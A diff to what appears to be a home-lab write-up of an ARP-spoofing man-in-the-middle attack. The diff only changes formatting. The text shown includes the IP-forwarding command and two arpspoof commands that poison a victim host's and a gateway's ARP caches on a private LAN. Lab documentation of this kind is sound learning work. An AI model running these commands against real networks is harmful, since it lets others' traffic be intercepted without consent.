@@ -20,6 +20,7 @@ LAN/Bridge Adapter Network
 Network Setup:
 
 Both attacker and victim were connected on the same local network.
+
 ##step 1
 Verified IP addresses using ifconfig and ip a.
 
@@ -30,13 +31,15 @@ Enabled IP forwarding:
 bash
 Copy
 Edit
-#step 2
+
+##step 2
 echo 1 > /proc/sys/net/ipv4/ip_forward
 Launched ARP spoofing using arpspoof:
 
 bash
 Copy
 Edit
+
 ##step 3
 sudo arpspoof -i eth0 -t  192.168.0.120  192.168.0.1
 sudo arpspoof -i eth0 -t  192.168.0.1  192.168.0.120
